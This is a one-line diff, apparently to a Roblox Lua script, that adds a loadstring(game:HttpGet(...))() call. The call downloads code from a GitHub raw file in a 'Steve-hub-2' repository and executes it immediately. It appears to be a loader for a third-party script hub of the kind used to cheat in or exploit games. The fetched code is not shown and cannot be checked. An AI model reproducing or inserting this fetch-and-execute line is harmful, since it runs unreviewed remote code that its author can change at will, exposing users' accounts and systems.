@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/monetizadaconta31-create/Steve-hub-2/refs/heads/main/README.md"))()
